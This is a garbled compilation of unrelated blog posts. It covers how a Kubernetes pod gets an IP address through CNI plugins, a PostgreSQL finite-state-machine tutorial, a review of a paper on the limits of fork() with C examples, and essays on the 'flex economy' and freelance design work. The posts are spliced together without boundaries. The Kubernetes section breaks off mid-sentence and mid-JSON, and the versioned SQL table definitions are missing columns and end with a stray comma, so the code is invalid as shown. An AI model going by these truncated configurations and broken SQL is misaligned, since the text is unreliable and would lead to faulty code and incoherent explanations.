<img src="https://ronaknathani.com/blog/2020/08/how-a-kubernetes-pod-gets-an-ip-address/kubelet-cri-cni-flowchart.png" alt="kubelet-cri-cni-flowchart"></p><p>Ref:
<a href="https://github.com/containerd/cri/blob/v1.11.1/docs/architecture.md" target="_blank" rel="noopener">Containerd cri plugin architecture</a></p><h2 id="interactions-between-container-runtime-and-cni-plugins">Interactions between Container Runtime and CNI Plugins</h2><p>Every network provider has a CNI plugin which is invoked by the container runtime to configure network for a pod as it’s started. With containerd as the container runtime,
<a href="https://github.com/containerd/cri" target="_blank" rel="noopener">Containerd CRI plugin</a> invokes the CNI plugin. Every network provider also has an agent that’s installed on each of the kubernetes node to configure pod networking. When the network provider agent is installed, it either ships with the CNI config or it creates one on the node which is then used by the CRI plugin to figure out which CNI plugin to call.</p><p>The location for the CNI config file is configurable and the default value is <code>/etc/cni/net.d/&lt;config-file&gt;</code>. CNI plugins need to be shipped on every node by the cluster administrators. The location for CNI plugins is configurable as well and the default value is <code>/opt/cni/bin</code>.</p><p>In case of containerd as the container runtime, path for CNI configuration and CNI plugin binaries can be specified under <code>[plugins."io.containerd.grpc.v1.cri".cni]</code> section of the
<a href="https://github.com/containerd/cri/blob/master/docs/config.md" target="_blank" rel="noopener">containerd config</a>.</p><p>Since we are referring to Flannel as the network provider here, I’ll talk a little about how Flannel is set up. Flanneld is the Flannel daemon and is typically installed on a kubernetes cluster as a daemonset with <code>install-cni</code> as an
<a href="https://github.com/coreos/flannel/blob/master/Documentation/kube-flannel.yml#L172" target="_blank" rel="noopener">init container</a>. The <code>install-cni</code> container creates the
<a href="https://gist.github.com/ronaknnathani/957a56210bd4fbd8e11120273c6b4ede" target="_blank" rel="noopener">CNI configuration file</a> - <code>/etc/cni/net.d/10-flannel.conflist</code> - on each node. Flanneld creates a vxlan device, fetches networking metadata from the apiserver and watches for updates on pods. As pods are created, it distributes routes for all pods across the entire cluster and these routes allow pods to connect to each other via their IP addresses. For details on how flannel works, I recommend the
<a href="#how-flannel-works">linked references below</a>.</p><p>The interactions between Containerd CRI Plugin and CNI plugins can be visualized as follows:
<img src="https://ronaknathani.com/blog/2020/08/how-a-kubernetes-pod-gets-an-ip-address/kubelet-cri-cni-interactions.png" alt="kubelet-cri-cni-interactions"></p><p>As described above, kubelet calls the Containerd CRI plugin in order to create a pod and Containerd CRI plugin calls the CNI plugin to configure network for the pod. The network provider CNI plugin calls other base CNI plugins to configure the network. The interactions between CNI plugins are described below.</p><h3 id="interactions-between-cni-plugins">Interactions Between CNI Plugins</h3><p>There are various CNI plugins that help configure networking between containers on a host. For this post, we will refer to 3 plugins.</p><h4 id="flannel-cni-plugin">Flannel CNI Plugin</h4><p>When using Flannel as the network provider, the Containerd CRI plugin invokes the
<a href="https://github.com/containernetworking/plugins/tree/master/plugins/meta/flannel" target="_blank" rel="noopener">Flannel CNI plugin</a> using the CNI configuration file - <code>/etc/cni/net.d/10-flannel.conflist</code>.</p><pre><code>$ cat /etc/cni/net.d/10-flannel.conflist
{
  "name": "cni0",
  "plugins": [
    {
      "type": "flannel",
      "delegate": {
		 "ipMasq": false,
        "hairpinMode": true,
        "isDefaultGateway": true
      }
    }
  ]
}
</code></pre><p>The Fannel CNI plugin works in conjunction with Flanneld. When Flanneld starts up, it fetches the podCIDR and other network related details from the apiserver and stores them in a file - <code>/run/flannel/subnet.env</code>.</p><pre><code>FLANNEL_NETWORK=10.244.0.0/16 
FLANNEL_SUBNET=10.244.0.1/24
FLANNEL_MTU=1450 
FLANNEL_IPMASQ=false
</code></pre><p>The Flannel CNI plugin uses the information in <code>/run/flannel/subnet.env</code> to configure and invoke the bridge CNI plugin.</p><h4 id="bridge-cni-plugin">Bridge CNI Plugin</h4><p>Flannel CNI plugin calls the Bridge CNI plugin with the following configuration:</p><pre><code>{
  "name": "cni0",
  "type": "bridge",
  "mtu": 1450,
  "ipMasq": false,
  "isGateway": true,
  "ipam": {
    "type": "host-local",
    "subnet": "10.244.0.0/24"
  }
}
</code></pre><p>When
<a href="https://github.com/containernetworking/plugins/tree/master/plugins/main/bridge" target="_blank" rel="noopener">Bridge CNI plugin</a> is invoked for the first time, it creates a linux bridge with the <code>"name": "cni0"</code> specified in the config file. For every pod, it then creates a veth pair - one end of the pair is in the container’s network namespace and the other end is connected to the linux bridge on the host network. With Bridge CNI plugin, all containers on a host are connected to the linux bridge on the host network.</p><p>After configuring the veth pair, Bridge plugin invokes the host-local IPAM CNI plugin. Which IPAM plugin to use can be configured in the CNI config CRI plugin uses to call the flannel CNI plugin.</p><h4 id="host-local-ipam-cni-plugins">Host-local IPAM CNI plugins</h4><p>The Bridge CNI plugin calls the

    "dataDir": "/var/lib/cni/networks"
  }
}
</code></pre><p>Host-local IPAM (IP Address Management) plugin returns an IP address for the container from the <code>subnet</code> and stores the allocated IP locally on the host under the directory specified under <code>dataDir</code> - <code>/var/lib/cni/networks/&lt;network-name=cni0&gt;/&lt;ip&gt;</code>. <code>/var/lib/cni/networks/&lt;network-name=cni0&gt;/&lt;ip&gt;</code> file contains the container ID to which the IP is assigned.</p><p>When invoked, the host-local IPAM plugin returns the following payload</p><pre><code>{

    <p>Inspired by <a href="https://felixge.de/2017/07/27/implementing-state-machines-in-postgresql.html">Felix Geisendorfer blog post</a> I implemented a database FSM (Finite-State Machine) with Postgresql.
I brought some improvements to Felix’s implementation but before reading the following I recommend you to read carefully <a href="https://felixge.de/2017/07/27/implementing-state-machines-in-postgresql.html">the original post</a>.
<!--more--></p>

<p><strong>TL;DR</strong> Here are the changes I did:</p>

<ul>
  <li>Introduced a versioning control of the FSM.</li>
  <li>Optimized performances and data storage.</li>
  <li>Added some protection against user mistakes</li>
</ul>

<p>To keep it simple I’ll use exactly the same FSM graph than Felix: an ordering process with payment and shipment steps.</p>

<p><img src="https://raphael.medaer.me/assets/img/pgfsm-graph-v1.png" alt=""></p>

<h3 id="types-optimization">Types optimization</h3>

<p>First I replaced the storage of states/events from <code>text</code> to <code>enum</code>. Because I have a finite number of states and transitions I can properly store them as custom <code>enum</code>. It reduces the storage of these to a lighter and constant 4 bytes.</p>

<div><div><pre><code><span>CREATE</span> <span>TYPE</span> <span>order_state</span> <span>AS</span> <span>ENUM</span> <span>(</span>
  <span>'start'</span><span>,</span>
  <span>'awaiting_payment'</span><span>,</span>
  <span>'awaiting_shipment'</span><span>,</span>
  <span>'awaiting_refund'</span><span>,</span>
  <span>'shipped'</span><span>,</span>
  <span>'canceled'</span><span>,</span>
  <span>'error'</span>
<span>);</span>
<span>CREATE</span> <span>TYPE</span> <span>order_event</span> <span>AS</span> <span>ENUM</span> <span>(</span>
  <span>'create'</span><span>,</span>
  <span>'pay'</span><span>,</span>
  <span>'ship'</span><span>,</span>
  <span>'refund'</span><span>,</span>
  <span>'cancel'</span>
<span>);</span>
</code></pre></div></div>

<p>If later I have to add new state or event I can easily do:</p>

<div><div><pre><code><span>ALTER</span> <span>TYPE</span> <span>order_event</span> <span>ADD</span> <span>VALUE</span> <span>'my_new_event'</span><span>;</span>
</code></pre></div></div>

<p>Obviously it impacts the <code>order_events</code> table:</p>

<div><div><pre><code><span>CREATE</span> <span>TABLE</span> <span>order_events</span> <span>(</span>
  <span>id</span> <span>bigint</span> <span>GENERATED</span> <span>ALWAYS</span> <span>AS</span> <span>IDENTITY</span> <span>PRIMARY</span> <span>KEY</span><span>,</span>
  <span>order_id</span> <span>uuid</span> <span>NOT</span> <span>NULL</span> <span>DEFAULT</span> <span>uuid_generate_v4</span><span>(),</span>
  <span>event</span> <span>order_event</span> <span>NOT</span> <span>NULL</span> <span>DEFAULT</span> <span>'create'</span><span>,</span>
  <span>time</span> <span>timestamp</span> <span>DEFAULT</span> <span>now</span><span>()</span> <span>NOT</span> <span>NULL</span>
<span>);</span>
</code></pre></div></div>

<p>As you noticed I replaced the <code>order_id</code> type from <code>INT</code> to <code>uuid</code>. In brief because it’s out of scope: <a href="https://www.clever-cloud.com/blog/engineering/2015/05/20/why-auto-increment-is-a-terrible-idea/">I never use serial for fields going out of database</a>.</p>

<h3 id="transition-mechanism-improvements">Transition mechanism improvements</h3>

<p>In his implementation, Felix Geisendorfer is using a <code>switch</code> statement to implement the state transition.
It’s a fine and straightforward solution. However, if you have more states/events it could become hard to maintain. Furthermore if you want to version your FSM, you’ll often have to <code>CREATE OR REPLACE FUNCTION</code>.
Instead I created a <em>mapping table</em> with 3 columns:</p>

<ul>
  <li><code>state</code>: the current state</li>
  <li><code>event</code>: the event which causes the transition</li>
  <li><code>next_state</code>: the resulting state</li>
</ul>

<div><div><pre><code><span>CREATE</span> <span>TABLE</span> <span>order_events_transitions</span> <span>(</span>
  <span>state</span>      <span>order_state</span> <span>NOT</span> <span>NULL</span><span>,</span>
  <span>event</span>      <span>order_event</span> <span>NOT</span> <span>NULL</span><span>,</span>
  <span>next_state</span> <span>order_state</span> <span>NOT</span> <span>NULL</span><span>,</span>
  <span>PRIMARY</span> <span>KEY</span> <span>(</span><span>state</span><span>,</span> <span>event</span><span>,</span> <span>next_state</span><span>)</span>
<span>);</span>
</code></pre></div></div>

<p><em>AN: I can limit transitions to only one path for two given states with <code>PRIMARY KEY (state, event)</code>.</em></p>

<p>Any transition which is not in this table will be resolved as <code>error</code> state in our new transition function:</p>

<div><div><pre><code><span>CREATE</span> <span>FUNCTION</span> <span>order_events_transition</span><span>(</span><span>_state</span> <span>order_state</span><span>,</span> <span>_event</span> <span>order_event</span><span>)</span>
<span>RETURNS</span> <span>order_state</span> <span>LANGUAGE</span> <span>sql</span> <span>AS</span> <span>$$</span>
<span>SELECT</span> <span>COALESCE</span><span>(</span>
  <span>(</span><span>SELECT</span> <span>next_state</span> <span>FROM</span> <span>order_events_transitions</span> <span>WHERE</span> <span>state</span><span>=</span><span>_state</span> <span>AND</span> <span>event</span><span>=</span><span>_event</span><span>),</span>
  <span>'error'</span><span>::</span><span>order_state</span>
<span>);</span>
<span>$$</span><span>;</span>
</code></pre></div></div>

<p><em>AN: There is maybe a better way then “COALESCE” to implement the “default”…</em></p>

<p>OK! It’s now time to write valid transitions:</p>

<div><div><pre><code><span>INSERT</span> <span>INTO</span> <span>order_events_transitions</span> <span>VALUES</span>
  <span>(</span><span>'start'</span><span>,</span>             <span>'create'</span><span>,</span> <span>'awaiting_payment'</span> <span>),</span>
  <span>(</span><span>'awaiting_payment'</span><span>,</span>  <span>'pay'</span><span>,</span>    <span>'awaiting_shipment'</span><span>),</span>
  <span>(</span><span>'awaiting_payment'</span><span>,</span>  <span>'cancel'</span><span>,</span> <span>'canceled'</span>         <span>),</span>
  <span>(</span><span>'awaiting_shipment'</span><span>,</span> <span>'cancel'</span><span>,</span> <span>'awaiting_refund'</span>  <span>),</span>
  <span>(</span><span>'awaiting_shipment'</span><span>,</span> <span>'ship'</span><span>,</span>   <span>'shipped'</span>          <span>),</span>
  <span>(</span><span>'awaiting_refund'</span><span>,</span>   <span>'refund'</span><span>,</span> <span>'canceled'</span>         <span>);</span>
</code></pre></div></div>

<h3 id="fsm-graph-versioning">FSM graph versioning</h3>

<p>In real life my use cases and business processes are moving (fast). Probably yours as well.
Since the FSM I build is the implementation of this processes, each change IRL impacts my database design.</p>

<p>For instance a state <code>awaiting_approval</code> could be added before allowing to pay.</p>

<p><img src="https://raphael.medaer.me/assets/img/pgfsm-graph-v2.png" alt=""></p>

<p>If I change my transition function and table without taking care of past <code>order_events</code>, I will completly break my FSM. Indeed because I’m moving the <code>create</code> event, all the already recorded transitions will raise an <code>error</code> state. It’s not <a href="https://en.wikipedia.org/wiki/Maintainability">maintainable</a>!</p>

<blockquote>
  <p>How to handle multiple versions of my FSM graph ?</p>
</blockquote>

<p>Introducing version control in my design will solve this issue.</p>

<p>First I create a table to store the versions and their status:</p>

<div><div><pre><code><span>CREATE</span> <span>TYPE</span> <span>order_fsm_version_status</span> <span>AS</span> <span>ENUM</span> <span>(</span>
  <span>'live'</span><span>,</span>
  <span>'deprecated'</span><span>,</span>
  <span>'obsolete'</span>
<span>);</span>
<span>CREATE</span> <span>TABLE</span> <span>order_fsm_versions</span><span>(</span>
  <span>version</span> <span>integer</span> <span>GENERATED</span> <span>ALWAYS</span> <span>AS</span> <span>IDENTITY</span> <span>PRIMARY</span> <span>KEY</span><span>,</span>
  <span>status</span>  <span>order_fsm_version_status</span> <span>NOT</span> <span>NULL</span> <span>DEFAULT</span> <span>'live'</span>
<span>);</span>
</code></pre></div></div>

<p>In the meanwhile I create a function to get the last FSM up-and-running version:</p>

<div><div><pre><code><span>CREATE</span> <span>FUNCTION</span> <span>order_fsm_last_version</span><span>()</span>
<span>RETURNS</span> <span>integer</span> <span>LANGUAGE</span> <span>sql</span> <span>AS</span> <span>$$</span>
<span>SELECT</span> <span>version</span> <span>FROM</span> <span>order_fsm_versions</span> <span>WHERE</span> <span>status</span><span>=</span><span>'live'</span> <span>ORDER</span> <span>BY</span> <span>version</span> <span>DESC</span> <span>LIMIT</span> <span>1</span><span>;</span>
<span>$$</span><span>;</span>
</code></pre></div></div>
<p>Both <code>order_events</code> and <code>order_events_transitions</code> will need to reference this version:</p>

<div><div><pre><code><span>CREATE</span> <span>TABLE</span> <span>order_events</span> <span>(</span>
  <span>id</span>       <span>bigint</span>      <span>GENERATED</span> <span>ALWAYS</span> <span>AS</span> <span>IDENTITY</span> <span>PRIMARY</span> <span>KEY</span><span>,</span>

  <span>FOREIGN</span> <span>KEY</span> <span>(</span><span>version</span><span>)</span> <span>REFERENCES</span> <span>order_fsm_versions</span><span>(</span><span>version</span><span>)</span>
<span>);</span>

<span>CREATE</span> <span>TABLE</span> <span>order_events_transitions</span> <span>(</span>
  <span>state</span>      <span>order_state</span> <span>NOT</span> <span>NULL</span><span>,</span>

  <span>version</span>    <span>integer</span>     <span>NOT</span> <span>NULL</span> <span>DEFAULT</span> <span>order_fsm_last_version</span><span>(),</span>
  <span>next_state</span> <span>order_state</span> <span>NOT</span> <span>NULL</span><span>,</span>
  <span>PRIMARY</span> <span>KEY</span> <span>(</span><span>state</span><span>,</span> <span>event</span><span>,</span> <span>version</span><span>,</span> <span>next_state</span><span>),</span>

<span>);</span>
</code></pre></div></div>

<p>The transition function and its aggregate also have to take care of this version number:</p>

<div><div><pre><code><span>CREATE</span> <span>FUNCTION</span> <span>order_events_transition</span><span>(</span>

		<!-- excerpt start -->
<p>A review of Baumann et.als paper on limitations of the fork system call present in UNIX operating systems.
<!-- excerpt end --></p>

<p><a href="https://www.microsoft.com/en-us/research/uploads/prod/2019/04/fork-hotos19.pdf">Baumann, Andrew, et al. “A fork () in the road.” <em>Proceedings of the Workshop on Hot Topics in Operating Systems</em>. 2019</a>.</p>

<p>This is a paper that only affects a small number of people: those doing OS research and those that directly call <code>fork</code> from their programs. Still, I find it interesting since it points to limitations in the UNIX design. When I learned to program, UNIX was seen as the gold standard. I remember reading an LKML post from Linus Torvalds where he meant that OS development was about the refinement of existing ideas, not so much about inventing new concepts.  But people still do OS research, and the paper describes how having to support <code>fork</code> can be a burden.</p>

<p>The main criticism in the paper is about how <code>fork</code> affects many other parts of the system. It was originally a very simple idea: copy the address space of the parent and let the child redirect file descriptors, reduce permissions or, alter the namespace of the child.  But <code>fork</code> today impacts all other operating system abstractions with which it was once orthogonal. Below are some practical examples of things mentioned in the paper.</p>

<h2 id="buffered-io-and-fork">Buffered I/O and Fork</h2>

<p>What do you think this program will print?</p>

<div><div><pre><code>#include &lt;stdio.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;unistd.h&gt;

int main(void) {
    printf("Hello World! ");
    pid_t pid = fork();
    return 0;
}
</code></pre></div></div>

<p>It prints the output twice, <code>Hello World! Hello World!</code>, since the stdio buffers are flushed both in the parent and in the child. So  in this case <code>fork</code> doesn’t compose, since the calling code needs to explicitly flush I/O before calling <code>fork</code>.</p>

<h2 id="threads-and-fork">Threads and Fork</h2>

<p>This program starts a thread that locks a mutex for 1ms. It then forks a child which tries to lock the same mutex. What do you think it will print and why?</p>

<div><div><pre><code>#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;pthread.h&gt;
#include &lt;sys/wait.h&gt;

static pthread_mutex_t thread_mutex = PTHREAD_MUTEX_INITIALIZER;

static void* worker(void* arg) {
    pthread_detach(pthread_self());

    for (;;) {
      pthread_mutex_lock(&amp;thread_mutex);
      usleep(1000);
      pthread_mutex_unlock(&amp;thread_mutex);
    }
    return NULL;
}

int main() {
    pthread_t thread;
    pthread_create(&amp;thread, NULL, worker, 0);

    usleep(1000);
    pid_t pid = fork();

    if (pid == 0) {
        pthread_mutex_lock(&amp;thread_mutex);
        const char buf[] = "lock acquired\n";
        write(fileno(stderr), buf, strlen(buf));
        pthread_mutex_unlock(&amp;thread_mutex);
        exit(0);
    }

    wait3(NULL, WNOHANG, NULL);

    return 0;
}
</code></pre></div></div>

<p>On my system, the subprocess always deadlocks before printing the <code>lock acquired</code> message. A child created by <code>fork</code> has only a single thread (a copy of the calling thread). So there’s a good chance that the mutex will be in the locked state when the child starts executing. One common case where this happens is if a thread doing memory allocation and holding a heap lock, while <code>fork </code>is called.</p>

<h2 id="large-address-spaces-and-fork">Large address spaces and Fork</h2>

<p>How long do you think it takes to fork if the parent has 10K VMAs? Here’s a test program from Chromes <a href="https://bugs.chromium.org/p/chromium/issues/detail?id=819228">Issue 819228: Consider using posix_spawn() on Linux</a>.</p>

<div><div><pre><code>/* Allocates several memory ranges and reports how long it takes to fork().
 *
 * clang slow_fork.c -o slow_fork &amp;&amp; ./slow_fork 100 10
 *
 * Almost no error checking anywhere.
 */
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;sys/mman.h&gt;
#include &lt;time.h&gt;
#include &lt;unistd.h&gt;

#define PAGE_SIZE 4096
#define SIZE 100 * PAGE_SIZE

void* mmap_anonymous(size_t size) {
  return mmap(NULL, size, PROT_READ | PROT_WRITE,
              MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
}

void** create_vmas(int count) {
  void** result = (void**) calloc(count, sizeof(void*));
  if (!result)
    return NULL;

  for (int i = 0; i &lt; count; i++) {
    result[i] = mmap_anonymous(SIZE);
    if (!result[i])
      return NULL;
  }
  return result;
}

void remove_vmas(void** arrays, int count) {
  for (int i = 0; i &lt; count; i++) {
    munmap(arrays[i], SIZE);
  }
  free(arrays);
}

void memset_all(void** arrays, int count) {
  for (int i = 0; i &lt; count; i++) {
    memset(arrays[i], 0, SIZE);
  }
}

struct timespec now() {
  struct timespec now;
  clock_gettime(CLOCK_MONOTONIC, &amp;now);
  return now;
}

long interval_ns(struct timespec tick, struct timespec tock) {
  return (tock.tv_sec - tick.tv_sec) * 1000000000L
      + (tock.tv_nsec - tick.tv_nsec);
}

int main(int argc, char** argv) {
  int vmas, iterations;
  void** areas;
  struct timespec tick, tock;

  if (argc != 3) {
    printf("Usage: %s &lt;nb_vmas&gt; &lt;iterations&gt;\n", argv[0]);
    return 1;
  }

  vmas = atoi(argv[1]);
  iterations = atoi(argv[2]);

  for (int i = 0; i &lt; iterations; i++) {
    areas = create_vmas(vmas);
    if (!areas)
      return 1;

    memset_all(areas, vmas);

    tick = now();
    if (fork()) {
      // parent.
      tock = now();
      long ns = interval_ns(tick, tock);
      printf("%.2fus to fork().\n", (double) ns / 1e3);
    } else {
      _exit(0);
    }
    remove_vmas(areas, vmas);
  }

  return 0;
}
</code></pre></div></div>

<p>On my system, here are the run-times:</p>

<div><div><pre><code>$ ./fork 1 1
149.65us to fork().
$ ./fork 10 
89.63us to fork().
$ ./fork 100 1
576.18us to fork().
$ ./fork 1000 1
2661.38us to fork().
$ ./fork 10000 1
35420.67us to fork().
</code></pre></div></div>

<p>So 35ms to <code>fork</code> with 10K VMAs. If I replace the <code>fork</code> call with <code>vfork</code> it takes only 115us! The speed difference is because <code>fork</code> needs to copy the page table entries to the new address space.</p>

<p>To get around these limitations some systems mark memory-mapped regions as not to be forked. Others like Chrome creates  a zygote process that has as little memory allocated as possible to ensure fast process creation times.</p>

<h2 id="alternatives-to-fork">Alternatives to Fork</h2>

<p>You can use <code>vfork</code>  or <code>posix_spawn</code> instead. The <code>vfork</code> function creates a new process but does not copy the parent’s page tables. Instead, it starts the child in the same address space as its parent and starts it  before the parent. The only thing that can be done from there is calling èxec<code>. The </code>posix_spawn<code> API is much more complicated than just calling </code> <code>fork</code>, but as we’ve seen the simplicity comes with a great burden on modern systems.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>As mentioned in our <a href="https://archimydes.dev/fourthact/blog/history-of-work-acts-1-2-and-3" target="_blank">previous post</a>, human economic productivity, or work, has been through three great Acts through the ages - the Hunter-Gatherer, the Agrarian, and the Industrial. We are now at very beginnings of what is the Fourth Great Act in this ever-evolving human economic drama - the Information Age. While Act 1 was largely about survival, Acts 2 and 3 were more about duty and responsibility. What will Act 4 of work be about? Can work finally be about passion and not simply survival or a paycheck? To answer this question we will have to examine what the Future of Work possibly holds.</p><p>In 2008, Kevin Kelly of Wired Magazine wrote a now-legendary post called "<a href="https://kk.org/thetechnium/1000-true-fans/" target="_blank">1000 True Fans</a>". The idea shared was as simple as it was revolutionary, in that to succeed in the Information Age, one doesn't need millions of dollars, or millions of fans - you could be fairly successful with 1000 true fans. The math behind it is simple, if you can convince 1000 people to pay $100 a year or $8.33/month, for something that can be produced for 0 or close to 0 marginal cost (think almost anything digital), then you generate an income of $100,000 a year. $100,000 a year is double the gross household income of Luxembourg - the country with the world's highest median income.</p><p>At the end of 2019, Li Jin of A16Z, wrote an updated and almost equally insightful piece - "<strong><a href="https://a16z.com/2020/02/06/100-true-fans/" target="_blank">1000 True Fans? Try 100</a></strong>". In this piece, Li, who is an investor and board member in companies such as <a href="https://substack.com/" target="_blank">Substack</a>, makes the argument that another way to get to $100,000 per year is to have 100 true-true fans, pay $1,000 a year, or $83.33 a month, for something that you can produce for 0 or close to 0 marginal cost. Li's argument for this is based on what creators are actually able to do on "Passion Economy" platforms such as Substack, Teachable etc. She doesn't necessarily argue that one monetization strategy is necessarily better or easier to achieve than the other, but that both are monetization strategies that should be given thought and consideration.</p><p>What both of these articles have in common though is the idea that we are moving into a new, creative-age of work, where creators will be rewarded for what they produce by niche audiences from around the world. A16Z very specifically refers to this type of monetization as the "Passion Economy", which stands in stark contrast to the "Gig Economy" which is largely transaction-based and does not reward outstanding performance or service. Below is a table from the above mentioned A16Z blog post differentiating the two:</p><center><img src="https://strapi-contents.s3.us-east-2.amazonaws.com/fourthact_Sheet1_1_cf2658fb42.png" width="400"></center><p>From my perspective, I do not think the Future of Work will offer a binary choice, between the "Passion Economy" and the "Gig Economy". In particular, I think that while people do like the autonomy offered by being a part of the "Passion Economy", you practically need to be a solo entrepreneur to be successful in the Passion Economy. To be successful in the way Kevin or Li describes, can often involve a not insignificant, multi-year ramp-up period. Like with any other kind of entrepreneurship, solo entrepreneurship is hard and isn't for everyone - at least not yet.</p><p>So what alternatives are there to the Gig Economy and the Passion Economy? Well the most obvious still remains full-time employment at an organization. However as the Information Age has progressed, two things have happened:</p><ul><li><p>The size of companies, particularly in the digital space, has become much smaller. Where once a Kodak required close to 150,000 people working together, Instagram required 13 people working together at the time of its purchase by Facebook. Even today, with over half a billion users, the Instagram team at Facebook has only a little more than 5,000 full-time employees.</p></li><li><p>The churn in companies has increased manifold relative to the stability offered in most industrial age organizations. The average tenure of companies on the S&amp;P 500 which was approximately 33 years in 1964, will drop to just 12 years by 2027.</p></li></ul><p>We now live in a world that was described by Michael Malone, in his 2009 book <a href="https://www.amazon.com/Future-Arrived-Yesterday-Protean-Corporation/dp/0307406903" target="_blank">The Future Arrived Yesterday</a>, where the multi-national behemoths of the Industrial Age are being replaced by Protean Corporations of the Information age. Protean corporations - more commonly known as startups - are described as shapeshifting and are characterized by a relatively small core group of people coming together to build a company. This core group of people work together for say a period of 5-6 years building a company, let's call it a startup, pivots as needed (shapeshifting within the same org), scale it up to a certain point, exits, and moves on to their next (ad)venture (shapeshifting to a new org). The closest analogy to this form of an organization up to this point in time, albeit generally for even shorter periods of time, are film or show crews that make a movie or multi-year show together. What is more important for the purpose of this post though, is not the core group itself, but the much larger pool of flex talent (see image below), that the core group plugs into.</p><center><img src="https://strapi-contents.s3.us-east-2.amazonaws.com/Protean_Corporation_v2_1_Aug2020_b54570c76b.png" width="250"></center><p>Are people that work in this much larger "flex" talent pool then the same as those that work in the "Gig Economy"? I will argue not, and for two critical reasons:</p><ul><li><p><strong>Context</strong>: Gig economy workers, do not require any context. Someone working for Uber, for example, needs to have zero context about the passenger that they are picking up and dropping off. The relationship is purely transactional. However, context is important when more sophisticated knowledge work like software development is involved. When onboarding a developer, for even say a single sprint, it is useful to bring on someone that has context on what your application is all about and who has some familiarity with the codebase.</p></li><li><p><strong>Specialization</strong>: Specialization is very important in the flex talent pool. Sticking to the Uber analogy, it isn't critical for an Uber driver to have Formula 1 driving skills to be employable. If I want to go from point A to point B driving skills matter very little. However, if I want a piece of code written that, for example, renders social graph features into my application, I am willing to pay a premium for someone that has experience with building similar features for other applications.</p></li></ul><p>Are these individuals then a part of the "Passion Economy"? Not quite. They might, in that what they work on day to day might very well be what they are most passionate about - however, it doesn't have to be. For example, not every developer I know is consumed by code. Some are, but most of them view their work as their profession, not necessarily their life's calling. They take up software development as a profession because it offers them a path forward to a more balanced and fulfilling life in general. More importantly, though, they are not like solo entrepreneurs. They are not for example constantly working on creating or distributing new content. They are not producing scalable output (for themselves at least) in the same way as someone on Substack or Teachable is - at least not yet.</p><p>From my perspective, I wouldn't term these resources as gig workers, passion workers, or as traditional full-time employees, but as "flex talent." Similarly, the companies that serve them (like <a href="https://www.archimydes.dev/" target="_blank">Archimydes</a>), I would call flex companies and the economy that constitutes this workforce as the "Flex Economy."</p><p>I also believe that particularly with the rise of remote work, asynchronous work processes will come to the forefront, enabling more efficient distribution of work both from the point of view of the company and talent. This will create a very large impetus towards the "Elex Economy" in which arguably more people will participate in than either the "Gig Economy" or the "Passion Economy". Below is an updated table that will characterize work in the "Flex Economy":</p><center><img src="https://strapi-contents.s3.us-east-2.amazonaws.com/fourthact_Sheet2_2_6840bbd059.png" width="400"></center><p>I expect flex work, particularly as it relates to software development, to replace full-time work as the dominant form of employment in the not too distant future. Flex talent will maintain anywhere from between a half a dozen to a dozen "projects" with different clients throughout the year. This will open up multiple revenue streams, with much greater autonomy than afforded in full-time work, and a larger take home. While this might not be the utopia of pure passion-based work, it is a huge step forward from the extremely fragile, industrial-age full-time work model. Additionally, it will embolden those that have hitherto held back from pursuing their passions because of the fear of losing a paycheck to do so with a safety net in place. As anyone that has pursued work in the Passion Economy will attest to even getting to 100 paying true-true fans paying a $1000 a year, can take several years!</p></div></div>]]>

<p>I am much happier making and shipping products than working on assignments for client projects. This realization comes as a surprise to me since I spent so much time honing skills to attract clients.</p>

<p>But there were always a least two issues with freelancing for me: the first ties to discretion. On one side, you have all these NDA preventing you from showing your best work, and thus you have little to show for, even after years of working for clients. The creative industry is an industry, and herein lies the problem with the creative economy. That leads us to the second issue I have with it: as a freelancer, my skills rarely get exploited as they should, in the proper sense of the word. One of the reasons for this is a failure on my part to communicate well about what I do. It is comparable to how agencies are the worst at communication when it comes to themselves. So maybe there is a reason along that line when it comes to present my portfolio of work. Or this is a simple curation mistake. There is always a lack of distance, a lack of objectivity when a designer presents their work. It is hard to pinpoint. The main reason, though, could be people’s inherent need for categorization. As a practice, design encompasses strategy, understanding, psychology, vision, decision-making, marketing, and aesthetics, to name a few. Similarly, illustration is not just one field, and there is no reason why I would want to limit my practice to a single style either. Concept art, editorial, cartoon, comics, historical illustration, animation, and visualizing are all equally challenging as they are different and attractive as a profession.</p>

<p>For me, the hardest part to explain to prospective clients is the difference between each assignment in my portfolio. In other words, diversity, something I inherently enjoy, leads to positioning and consistency troubles. In terms of branding, this is a generalist’s problem that can turn into a little bit of a nightmare: how can you showcase diametrically different skills in a way that doesn’t look like a weakness? And that might even be the wrong question to face the problem, mind you.</p>

<p>Now suppose that your skills lead to assignments in different fields, or that you need to partake in gigs that require a growing list of skills to be able to compete since you are not the best of the world in a unique, single skillset. In that scenario, you can take a partitioning approach: brand a for issue x, brand b for issue y, brand c for issue z, ok you get the idea. But that leads to another problem: waste. You will need to craft a portfolio for each of those sub-brands, think about a strategy, think about a presentation. Now, don’t get me wrong: honing your skills is never a waste of time. You will always learn useful things if you persevere. Yet it is a matter of priorities, even more so as a freelancer or a solo entrepreneur. You must decide where best to spend your finite energy resources. Add all the other issues that belong to freelance life, such as prospecting, invoicing, late payments, IP, and legal matters, all that cost a lot of time and energy. Whether you are a freelancer or a company makes no difference: you try to reduce efforts in some areas to be able to concentrate better on areas that matter more. Focus. Reduce waste. On the other hand, the opportunity cost may be even higher if you specialize, which takes years, only to find yourself unemployed once your unique skill is no longer under demand.</p>

<p>Shipping product(s) of your own spare you some of these problems, with the additional benefit of being compatible with doing client work. Another advantage is that developing a product that you use yourself puts you in the client’s shoes. It makes you consider problems from other angles. Any problem that you experience firsthand reinforces your ability to solve it on behalf of a client later. Companies, like <a href="https://basecamp.com/">Basecamp</a>, <a href="https://ia.net/">iA</a>, and <a href="https://gumroad.com/">Gumroad</a>, found their special calling once they started developing products on their own. Basecamp started as a web design agency (37signals), developing tools to ease their workflow led them to writing software that became their core business. iA, while still working for clients, developed the minimalist yet highly polished <a href="https://ia.net/writer">iA Writer</a>, initially to remedy their frustration at the lack of a simple text editor. Gumroad’s founder wanted a simple way to sell a product online. That did not exist, so he designed his own.</p>

